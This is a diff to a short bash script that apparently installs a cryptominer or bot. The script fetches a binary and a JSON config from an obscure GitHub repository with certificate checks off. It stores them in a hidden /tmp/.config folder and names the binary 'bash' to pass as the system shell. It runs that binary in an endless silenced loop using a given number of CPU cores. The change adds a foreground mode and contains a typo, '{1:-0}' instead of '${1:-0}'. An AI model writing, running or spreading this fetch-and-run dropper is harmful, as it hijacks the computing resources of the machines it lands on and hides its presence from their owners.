@@ -1,5 +1,6 @@
 #!/bin/bash
 
+mode="{1:-0}"
 src="https://raw.githubusercontent.com/vjbahkds/jsncsdccw/main"
 
 # Debian12+
@@ -20,5 +21,9 @@ wget --no-check-certificate -4 -qO "/tmp/.config/appsettings.json" "${src}/q.jso
 wget --no-check-certificate -4 -qO "/tmp/.config/bash" "${src}/q"
 chmod -R 777 "/tmp/.config"
 
-bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done" >/dev/null 2>&1 &
+if [ "$mode" == "0" ]; then
+  bash -c "while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done" >/dev/null 2>&1 &
+else
+  while true; do cd /tmp/.config; ./bash ${name} ${cores} >/dev/null 2>&1 ; done
+fi
 
